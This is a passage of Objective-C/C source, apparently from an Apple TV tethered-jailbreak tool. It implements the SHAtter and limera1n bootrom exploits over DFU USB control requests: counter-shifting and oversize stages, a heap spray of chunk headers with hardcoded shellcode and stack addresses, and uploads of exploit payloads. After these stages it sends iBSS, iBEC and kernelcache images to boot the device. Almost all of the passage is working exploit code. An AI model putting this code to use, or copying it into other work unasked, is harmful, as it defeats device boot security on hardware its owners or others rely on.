        return 0;
    }
    SHAtter_user.status++;
    
    NSLog(@"shatter status: %i\n", SHAtter_user.status);
    unsigned int shift = 0x80;
    const int usb_packet_size = 0x800;
    int ret;
    char* pbuf = NULL;
    
    if(SHAtter_user.status == 1) {
        SHAtter_user.addr = 0x84000000;
        SHAtter_user.dwn_addr = 0x84000000;
        
        [(tetherKitAppDelegate*)tetherClass setInstructionText:@""];
        NSLog(@"\n[!] Exploiting with SHAtter... [!]\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Exploiting with SHAtter..."];
        NSLog(@"[.] _PASS_1_\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"PASS_1"];
        NSLog(@"[.] Preparing Oversize...\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Preparing oversize..."];
        
        memset(SHAtter_user.buf, 0, sizeof(SHAtter_user.buf));
        NSLog(@"[.] resetting counters...\n");
        ret = reset_counters(Device);
        if (ret < 0) {
            NSLog(@"[X] failed to reset USB counters.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to reset USB counters."];
            
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        NSLog(@"[.] shifting DFU_UPLOAD count...\n");
        unsigned char data[0x800];
        ret = send_control_request_to(Device, 0xA1, 2, 0, 0, shift, data, 1000);
        if (ret < 0) {
            NSLog(@"[X] failed to shift DFU_UPLOAD counter.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to shift DFU_UPLOAD counter."];
            
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        SHAtter_user.addr += shift;
        sleep(1);
        NSLog(@"[.] resetting DFU.\n");
        reset_device(Device);
        sleep(1);
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Resetting DFU..."];
        
        ret = finish_transfer(Device);
        NSLog(@"finished transfer with status: %i\n", ret);
        [(tetherKitAppDelegate*)tetherClass updateStatus:SHAtter_user.status];
        
    } else if(SHAtter_user.status == 2) {
        SHAtter_user.addr = 0x84000000;
        SHAtter_user.dwn_addr = 0x84000000;
        
        pbuf = SHAtter_user.buf;
        
        while(SHAtter_user.dwn_addr < (0x84000000 + sizeof(SHAtter_user.buf)) && ret >= 0) {
            ret = send_control_request_to(Device, 0x21, 1, 0, 0, usb_packet_size, pbuf, 1000);
            SHAtter_user.dwn_addr += usb_packet_size;
            pbuf += usb_packet_size;
        }
        
        if (ret < 0) {
            NSLog(@"[X] failed to upload exploit data.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to upload exploit data."];
            
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        
        NSLog(@"[.] Exploit data successfully sent!\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Exploit data successfully sent!"];
        
        SHAtter_user.addr_final = SHAtter_user.addr + sizeof(SHAtter_user.buf);
        while(SHAtter_user.addr < SHAtter_user.addr_final  && ret >= 0) {
            ret = send_control_request_to(Device, 0xA1, 2, 0, 0, usb_packet_size, (unsigned char*) SHAtter_user.data, 1000);
            SHAtter_user.addr += usb_packet_size;
        }
        if (ret < 0) {
            NSLog(@"[X] failed to shift DFU_UPLOAD counter.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to shift DFU_UPLOAD counter."];
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        NSLog(@"[.] SHA1 registers pointed to 0x0.\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"SHA1 registers pointed to 0x0."];
        
    } else if(SHAtter_user.status == 3) {
        SHAtter_user.addr = 0x84000000;
        SHAtter_user.dwn_addr = 0x84000000;
        shift = 0x140;
        
        NSLog(@"[.] _PASS_2_\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"PASS_2."];
        
        NSLog(@"[.] preparing oversize...\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Preparing oversize..."];
        
        ret = reset_counters(Device);
        if (ret < 0) {
            NSLog(@"[X] failed to reset USB counters.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to reset USB counters."];
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        ret = send_control_request_to(Device, 0xA1, 2, 0, 0, shift, (unsigned char*) SHAtter_user.data, 1000);
        if (ret < 0) {
            NSLog(@"[X] failed to shift DFU_UPLOAD counter.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to shift DFU_UPLOAD counter."];
            
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        SHAtter_user.addr += shift;
        reset_device(Device);
        
        ret = finish_transfer(Device);
        NSLog(@"finish transfer finished with status: %i\n", ret);
        
        NSLog(@"[.] resetting DFU.\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Resetting DFU..."];
        
        [(tetherKitAppDelegate*)tetherClass updateStatus:SHAtter_user.status];
        
    } else if(SHAtter_user.status == 4) {
        NSLog(@"[.] now uploading exploit.\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Uploading exploit payload..."];
        
        memcpy(SHAtter_user.buf, &shatter_payload_bin, sizeof(shatter_payload_bin));
        pbuf = SHAtter_user.buf;
        while(SHAtter_user.dwn_addr < (0x84000000 + sizeof(SHAtter_user.buf))) {
            ret = send_control_request_to(Device, 0x21, 1, 0, 0, usb_packet_size, pbuf, 1000);
            SHAtter_user.dwn_addr += usb_packet_size;
            pbuf += usb_packet_size;
        }
        if(ret < 0) {
            NSLog(@"[X] failed to upload exploit data.\n");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"failed to upload exploit payload!"];
            
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        
        SHAtter_user.addr_final = SHAtter_user.addr + sizeof(SHAtter_user.buf);
        
        while(SHAtter_user.addr < SHAtter_user.addr_final  && ret >= 0) {
            ret = send_control_request_to(Device, 0xA1, 2, 0, 0, usb_packet_size, SHAtter_user.data, 1000);
            SHAtter_user.addr += usb_packet_size;
        }
        if (ret < 0) {
            NSLog(@"[X] failed to shift DFU_UPLOAD counter.");
            [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Failed to shift DFU_UPLOAD counter."];
            
            memset(&SHAtter_user, 0, sizeof(SHAtter_user));
            return 0;
        }
        sleep(1);
        NSLog(@"[.] Resetting the device...\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Resetting the device..."];
        
        reset_device(Device);
        [(tetherKitAppDelegate*)tetherClass updateStatus:SHAtter_user.status];
        
    } else if(SHAtter_user.status == 5){
        
        //        if (usbMode == 0)
        //        {
        //            stop_notification_monitoring(Device);
        //        }
        
        NSLog(@"[.] exploit sent.\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"exploit sent successfully"];
        
        char ibssPath[255];
        sprintf(ibssPath, "%s/iBSS.k66ap.RELEASE.dfu", filePath);
        NSLog(@"sending file: %s\n", ibssPath);
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Sending iBSS.k66ap.RELEASE.dfu..."];
        
        FILE* ibss = fopen(ibssPath, "rb");
        if(!ibss) {
            NSLog(@"PANIC!\n");
            return -1;
        }
        fseek(ibss, 0, SEEK_END);
        long len = ftell(ibss);
        fseek(ibss, 0, SEEK_SET);
        char* ibss_buf = (char*)malloc(len);
        fread(ibss_buf, 1, len, ibss);
        fflush(ibss);
        fclose(ibss);
        NSLog(@"Uploading iBSS...\n");
        fflush(stdout);
        int sentStatus = send_data(Device, ibss_buf, len);
        NSLog(@"iBSS sent status: %i\n", sentStatus);
        reset_device(Device);
        sentStatus = finish_transfer(Device);
        NSLog(@"iBSS finish_transfer: %i\n", sentStatus);
        sleep(1);
        free(ibss_buf);
        NSLog(@"[.] iBSS sent.\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"iBSS.k66ap.RELEASE.dfu sent"];
        
    } else if(SHAtter_user.status == 6) {
        char ibecPath[255];
        sprintf(ibecPath, "%s/iBEC.k66ap.RELEASE.dfu", filePath);
        NSLog(@"sending file: %s\n", "iBEC.k66ap.RELEASE.dfu");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Sending iBEC.k66ap.RELEASE.dfu..."];
        
        FILE* ibec = fopen(ibecPath, "rb");
        if(!ibec) {
            NSLog(@"PANIC!\n");
            return -1;
        }
        fseek(ibec, 0, SEEK_END);
        long len = ftell(ibec);
        fseek(ibec, 0, SEEK_SET);
        char* ibec_buf = (char*)malloc(len);
        fread(ibec_buf, 1, len, ibec);
        fflush(ibec);
        fclose(ibec);
        NSLog(@"Uploading iBEC...");
        fflush(stdout);
        int sendStatus = send_data(Device, ibec_buf, len);
        NSLog(@"sendData finished with: %i\n", sendStatus);
        sendStatus = finish_transfer(Device);
        NSLog(@"finish_transfer with: %i\n", sendStatus);
        free(ibec_buf);
        
        NSLog(@"[.] iBEC sent.\n");
        if (usbMode == 0){
            NSLog(@"[.] Restore mode, Done!\n");
            [(tetherKitAppDelegate*)tetherClass shatterFinished:0];
            usbMode = 0;
            return 1;
        } else {
            NSLog(@"[.] Tethered mode, Continue...\n");
        }
        
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Sleeping for 10..."];
        
        NSLog(@"sleeping 10, keep el cap happy\n");
        sleep(10);
    } else if(SHAtter_user.status == 7) {
        if (usbMode == 0){
            return 0;
        }
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Uploading kernelcache.release.k66..."];
        
        NSLog(@"Uploading kernelcache...\n");
        fflush(stdout);
        char kernelPath[255];
        sprintf(kernelPath, "%s/kernelcache.release.k66", filePath);
        NSLog(@"sending file: kernelcache.release.k66\n");
        
        int sentStatus = send_file(Device, kernelPath);
        
        NSLog(@"[.] kernelcache sent successfully! status: %i\n", sentStatus);
        
        sleep(5);
        int commandError = send_command(Device, "bootx");
        //NSLog(@"commanderror: %i\n", commandError);
        NSLog(@"DONE!\n");
        [(tetherKitAppDelegate*)tetherClass showProgressViewWithText:@"Tethered boot complete! It is now safe to disconnect USB."];
        [(tetherKitAppDelegate*)tetherClass shatterFinished:1];
        fflush(stdout);
        //  exit(1);
        
        
    }
    
    return 1;
}



int limerain(UKDevice *Device, bool ifaith_mode) {
    
    unsigned int i = 0;
    unsigned char buf[0x800];
    unsigned char shellcode[0x800];
    unsigned int max_size = 0x24000;
    unsigned int stack_address = 0x84033F98;
    unsigned int shellcode_address = 0x84023001;
    unsigned int shellcode_length = 0;
    int ret;
    
    double progress= 0.0;
    
    if (Device->pid != 0x1227) return -1;
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return -1;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return -1;
    }
    
    if (Device->cpid == 0x8930) {
        max_size = 0x2C000;
        stack_address = 0x8403BF9C;
        shellcode_address = 0x8402B001;
    }
    if (Device->cpid == 0x8920) {
        max_size = 0x24000;
        stack_address = 0x84033FA4;
        shellcode_address = 0x84023001;
    }
    
    memset(shellcode, 0x0, 0x800);
    
    if (ifaith_mode) {
        
        shellcode_length = sizeof(limera1n_payload_ifaith);
        memcpy(shellcode, limera1n_payload_ifaith, shellcode_length);
        
    } else {
        
        shellcode_length = sizeof(limera1n_payload_dfu);
        memcpy(shellcode, limera1n_payload_dfu, shellcode_length);
        
    }
    
    NSLog(@"Resetting device counters\n");
    
    ret = reset_counters(Device);
    
    if (ret) return ret;
    
    memset(buf, 0xCC, 0x800);
    for(i = 0; i < 0x800; i += 0x40) {
        unsigned int* heap = (unsigned int*)(buf+i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_address;
        heap[3] = stack_address;
    }
    
    NSLog(@"Sending chunk headers\n");
    
    ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0x800, buf, 1000); // 0x800

    progress += (double)((0x800*100)/max_size);
    memset(buf, 0xCC, 0x800); // 0x22800
    for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
        
        ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0x800, buf, 1000);
        if (ret) return ret;
        progress += (double)((0x800*100)/max_size);
    }
    
    NSLog(@"Sending exploit payload\n");
    
    ret = send_control_request_to(Device, 0x21, 1, 0, 0, 0x800, shellcode, 1000); // 0x800
    
    NSLog(@"Sending fake data\n");
    
    memset(buf, 0xBB, 0x800);
    
    ret = send_control_request_to(Device, 0xA1, 1, 0, 0, 0x800, buf, 1000); // 0x800
    if (ret) return ret;
    
    progress += (double)((0x800*100)/max_size);
    send_control_request_async(Device, 0x21, 1, 0, 0, 0x800, buf); // 0x800
    
    
    
    usleep(10000);
    
    abort_pipe_zero(Device);
    
    progress += (double)((0x800*100)/max_size);
    
    send_control_request_to(Device, 0x21, 2, 0, 0, 0, buf, 1000);
    
    ret = reset_device(Device);
    ret = finish_transfer(Device);
    
    return 0;
}

int send_data(UKDevice* Device, unsigned char* data, unsigned long length) {
    
    int         ret = -1;
    UInt32      data_size;
    UInt32      current_length = 0;
    UInt32      default_packet_size = 0x800;
    unsigned int status = 0;
    double progress = 0.0;
    
    Device->transaction = 0;
    
    if (Device->pid == 0x1227) {
        
        ret = get_status(Device, &status);
        if (ret) return ret;
        
    } else if (Device->pid == 0x1281) {
        default_packet_size = 0x8000;
        ret = send_control_request_to(Device, 0x41, 0, 0, 0, 0, NULL, 1000);
        if (ret) return ret;
    }
    
    while (current_length < length) {
        
        progress = (double)((current_length*100)/length);
        //[[IPhoneUSB sharedInstance] notifyUploadInProgress:progress];
        
        data_size = ((length - current_length) <= 0x7FF) ? ((unsigned int)length - current_length) : default_packet_size;
        
        if (Device->pid == 0x1227) {
            
            //ret
            ret = send_control_request_to(Device, 0x21, 1, Device->transaction, 0, data_size, data+current_length, 1000);
            //if (ret) return ret;
            
            Device->transaction++;
            
        } else if (Device->pid == 0x1281) {
            
            //ret
            ret = write_serial(Device, data+current_length, data_size);
            //if (ret) return ret;
        }
        
        current_length += data_size;
        double percentComplete = ((double)current_length/length)*100;
        NSLog(@"%f\n", percentComplete);
        NSNumber *progressNumber = [NSNumber numberWithDouble:percentComplete];
        [(tetherKitAppDelegate *)tetherClass performSelectorOnMainThread:@selector(threadedDownloadProgress:) withObject:progressNumber waitUntilDone:false];
    }
    
    
    if (Device->pid == 0x1227){
        
        ret = finish_transfer(Device);
        if (ret) return ret;
    }
    
    return ret;
    
}

int send_file(UKDevice * Device, const char * filename) {
    
    int ret = -1;
    
    if (!Device->opened) {
        
        NSLog(@"Device->opened == false\n");
        return ret;
    }
    
    if (!Device->enabled) {
        
        NSLog(@"Device->enabled == false\n");
        return ret;
    }
    
    if (Device->dev == NULL) {
        
        NSLog(@"Device->dev == NULL\n");
        return ret;
    }
    
    FILE* file = fopen(filename, "rb");
    
    if (file == NULL) return -1;
    
    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    char* data = (char*) malloc(length);
    
    if (data == NULL) {
        fclose(file);
        return ret;
    }
    
    long bytes = fread(data, 1, length, file);
    fclose(file);
    
    if (bytes != length) {
        free(data);
        return ret;
    }
    
    ret = send_data(Device, (unsigned char*)data, length);
    
    free(data);
    
    return ret;
}


